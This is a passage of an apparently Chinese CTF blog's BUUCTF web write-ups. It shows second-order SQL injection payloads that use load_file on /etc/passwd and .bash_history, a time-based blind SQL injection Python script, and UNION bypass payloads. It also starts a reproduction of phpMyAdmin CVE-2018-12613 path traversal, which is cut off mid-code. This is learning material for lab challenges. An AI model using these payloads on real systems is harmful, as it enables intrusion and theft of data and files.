class="line"><span class="keyword">switch</span> ($_GET[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">&#x27;category&#x27;</span>]);</span><br><span class="line">    $title = addslashes($_POST[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;insert into board</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                title = &#x27;<span class="subst">$title</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">&#x27;bo_id&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;select category from board where id=&#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">    $content = addslashes($_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">&quot;Location: ./comment.php?id=<span class="subst">$bo_id</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>login.php</code>爆破弱口令，密码为<code>zhangwei666</code></p><p><strong>addslashes()函数</strong>：</p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200406152546.png" style="zoom:80%;"><p>题目考察的是二次注入，即先向数据库插入闭合语句，然后再在查询时取出来，达到绕过addslashes()函数的作用</p><p>从上面的代码可以看到write那块是插入帖子信息到数据库，而comment那块是把评论并存到数据库里，并且这块根据id值取出了帖子category参数的内容，并插入数据库，所以，现在思路很明确，先发一个帖子，在category里写入<code>&#39;</code>闭合</p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200406151519.png" style="zoom:80%;"><p>此时执行的sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> board</span><br><span class="line">            <span class="keyword">set</span> <span class="keyword">category</span> = <span class="string">&#x27;\&#x27;</span>,<span class="keyword">content</span>=<span class="keyword">database</span>(),<span class="comment">/*&#x27;,</span></span><br><span class="line"><span class="comment">                title = &#x27;aaaaaaa&#x27;,</span></span><br><span class="line"><span class="comment">                content = &#x27;adsd&#x27;</span></span><br></pre></td></tr></table></figure><p>由于转义，插入到数据库的内容category字段值为<code>&#39;,content=database(),/*</code></p><p>接着我们再</p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200406152003.png" style="zoom:80%;"><p>此时执行插入操作的sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">comment</span></span><br><span class="line">            <span class="keyword">set</span> <span class="keyword">category</span> = <span class="string">&#x27;&#x27;</span>,<span class="keyword">content</span>=<span class="keyword">database</span>(),<span class="comment">/*&#x27;,</span></span><br><span class="line"><span class="comment">                content = &#x27;*/</span><span class="comment">#&#x27;,</span></span><br><span class="line">                bo_id = <span class="string">&#x27;9&#x27;</span></span><br></pre></td></tr></table></figure><p>就成功把database()作为content字段的内容插入</p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200406152746.png" style="zoom:80%;"><p>按照这种思路load_file读取文件<code>/etc/passwd</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;,content=(<span class="keyword">select</span>(<span class="keyword">load_file</span>(<span class="string">&quot;/etc/passwd&quot;</span>))),<span class="comment">/*</span></span><br></pre></td></tr></table></figure><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200406153117.png" style="zoom:80%;"><p>看到<code>/home/www</code>以bash运行，读一下<code>/home/www/.bash_history</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;,content=(<span class="keyword">select</span>(<span class="keyword">load_file</span>(<span class="string">&quot;/home/www/.bash_history&quot;</span>))),<span class="comment">/*</span></span><br></pre></td></tr></table></figure><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200406153402.png" style="zoom:80%;"><p>看命令可以猜测再<code>/tmp/html/.DS_Store</code>文件，直接读会读不全，用hex编码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;,content=(<span class="keyword">select</span> <span class="keyword">hex</span>(<span class="keyword">load_file</span>(<span class="string">&quot;/tmp/html/.DS_Store&quot;</span>))),<span class="comment">/*</span></span><br></pre></td></tr></table></figure><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200406154005.png" style="zoom:80%;"><p>访问一下，确实有，读一下<code>flag_8946e1ff1ee3e40f.php</code>文件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;,content=(<span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;</span>)),<span class="comment">/*</span></span><br></pre></td></tr></table></figure><p>得到flag</p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200406154459.png" style="zoom:80%;"><h2 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h2><h3 id="writeup-5"><a href="#writeup-5" class="headerlink" title="writeup"></a>writeup</h3><p>打开跳转到<code>login.php</code>，不知道为啥扫目录扫不到<code>register.php</code>,可能是buu环境的问题吧</p><p>先在login.php试了很久没有啥收获，先注册一个账号吧，登陆发现除了用户名啥都没有，fuzz一下，发现username处有注入</p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/QQ截图20200808174356.png" style="zoom:80%;"><p>fuzz一下发现过滤了<code>,</code>和<code>information</code>，由于逗号过滤</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(1,1,0)&lt;==&gt;  case when 1 then 1 else 0 end</span><br><span class="line">substr(database(),1,1)&lt;==&gt;substr(database() from 1 for 1)</span><br><span class="line">limt 9,4&lt;==&gt;limit 9 offset 4</span><br></pre></td></tr></table></figure><p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20200808192506.png"></p><p>测试上面payload可用，就可以写脚本了，exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://e2237b8f-0ea4-4294-bbe7-007af8f88f8b.node3.buuoj.cn/register.php&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">proxies=&#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>:<span class="string">&quot;127.0.0.1:8080&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    f1=flag</span><br><span class="line">    top=<span class="number">127</span></span><br><span class="line">    low=<span class="number">33</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=top:</span><br><span class="line">        mid=(top+low)//<span class="number">2</span></span><br><span class="line">        p1=<span class="string">&quot;aaaaa&#x27; || (case when ascii(substr((select*from flag) from &#123;&#125; for 1))&gt;&#123;&#125; then sleep(3) else 0 end) || &#x27;aaa&quot;</span>.format(i,mid)</span><br><span class="line">        p2=<span class="string">&quot;aaaaa&#x27; || (case when ascii(substr((select*from flag) from &#123;&#125; for 1))=&#123;&#125; then sleep(3) else 0 end) || &#x27;aaa&quot;</span>.format(i,mid)</span><br><span class="line">        data1=&#123;<span class="string">&#x27;email&#x27;</span>:<span class="string">&#x27;basb@qq.com&#x27;</span>,<span class="string">&#x27;username&#x27;</span>:p1,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;1234&#x27;</span>&#125;</span><br><span class="line">        data2=&#123;<span class="string">&#x27;email&#x27;</span>:<span class="string">&#x27;basb@qq.com&#x27;</span>,<span class="string">&#x27;username&#x27;</span>:p2,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;1234&#x27;</span>&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            print(i,mid)</span><br><span class="line">            r1=requests.post(url,data=data2,timeout=<span class="number">3</span>,proxies=proxies)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">            flag+=chr(mid)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r2=requests.post(url,data=data1,timeout=<span class="number">3</span>,proxies=proxies)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                top=mid<span class="number">-1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flag==f1:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><h3 id="writeup-6"><a href="#writeup-6" class="headerlink" title="writeup"></a>writeup</h3><p>广告处二次注入,过滤了空格，先判断列数，一个一个试发现有22列，判断回显位发现：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test&#x27;<span class="comment">/**/</span>UNION<span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20200808162756.png"></p><p>回显位为2,3位</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test1&#x27;<span class="comment">/**/</span>UNION<span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">database</span>(),(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">concat</span>(table_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="keyword">database</span>()),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>直接用发现会被拦，过滤了information_schema，bypass参考:</p><p><a href="https://www.anquanke.com/post/id/193512">https://www.anquanke.com/post/id/193512</a></p><p>可以无列名注入绕过，先猜一下表名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test2&#x27;<span class="comment">/**/</span>UNION<span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">count</span>(*)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">users</span>),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20200808165041.png"></p><p>三条，说明存在该表</p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/QQ截图20200808171132.png" style="zoom: 80%;"><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test3&#x27;<span class="comment">/**/</span>UNION<span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(a)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>b<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">users</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span>*<span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">users</span>)c),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20200808171715.png"></p><p>注flag内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test4&#x27;<span class="comment">/**/</span>UNION<span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(b)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>b<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">users</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span>*<span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">users</span>)c),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> buuctf </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf刷题-代码审计篇</title>
      <link href="2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/"/>
      <url>2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了buuctf web部分代码审计题目的wp！持续更新！</p><a id="more"></a><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h3><p>打开题目，查看源代码发现<code>source.php</code>,得到源代码，代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;$page</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>代码的大概意思是接受一个<code>file</code>的参数，限制变量类型为字符串，白名单检查通过检查就包含</p><p>这题的突破点就是url双重编码，从<code>hint.php</code>可知flag应该在<code>/ffffllllaaaagggg</code>，payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=hint.php%<span class="number">25</span>%<span class="number">33</span>%<span class="number">66</span>/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p><code>?</code>的url编码是<code>%3f</code>，双重编码是<code>%25%33%66</code>，在包含的时候会解析成<code>hint.php%3f</code>这个目录</p><p>这题的原型是phpmyadmin(CVE-2018-12613)后台任意文件包含漏洞</p><h3 id="CVE-2018-12613复现"><a href="#CVE-2018-12613复现" class="headerlink" title="CVE-2018-12613复现"></a>CVE-2018-12613复现</h3><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>此漏洞影响版本：4.8.0——4.8.1</p><p>漏洞的入口在<code>index.php</code> 54-63行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$target_blacklist = <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">&#x27;import.php&#x27;</span>, <span class="string">&#x27;export.php&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we have a valid target, let&#x27;s load that script instead</span></span><br><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; ! preg_match(<span class="string">&#x27;/^index/&#x27;</span>, $_REQUEST[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[<span class="string">&#x27;target&#x27;</span>], $target_blacklist)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;target&#x27;</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有5个条件，满足之后就会包含我们穿过来的文件。前4个条件都比较好理解，非空、必须为字符串、不能是index开头，不能是黑名单中的文件名（<code>import.php</code>、<code>export.php</code>)，重点看最后一个,Core类位于<code>libraries/classes/Core.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span>(<span class="params">&amp;$page, <span class="keyword">array</span> $whitelist = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($whitelist)) &#123;</span><br><span class="line">        $whitelist = <span class="built_in">self</span>::$goto_whitelist;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $_page = mb_substr(</span><br><span class="line">        $page,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mb_strpos($page . <span 